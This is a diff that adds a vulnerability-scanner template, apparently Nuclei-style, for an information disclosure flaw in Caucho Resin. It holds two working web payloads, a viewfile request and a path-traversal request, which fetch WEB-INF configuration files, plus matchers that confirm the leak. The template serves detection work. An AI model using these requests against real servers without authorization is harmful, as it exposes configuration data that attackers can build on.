@@ -1,0 +1,27 @@
+id: caucho-resin-info-disclosure
+brief:
+    title: Caucho Resin - Information Disclosure
+    by: pikpikcu
+    level: info
+    about: Caucho Resin contains an information disclosure vulnerability. The application does not properly sanitize user-supplied input. An attacker can potentially obtain sensitive information, modify data,...
+    label:
+        - exposure
+        - resin
+        - caucho
+        - edb
+        - vuln
+moves:
+    - verb: GET
+      to:
+        - '{{BaseURL}}/resin-doc/viewfile/?file=/WEB-INF/resin-web.xml'
+        - '{{BaseURL}}/%20../web-inf/web.xml'
+      signs:
+        - "on": word
+          has:
+            - <web-app
+            - </web-app>
+          in: body
+          need: all
+        - "on": status
+          status:
+            - 200
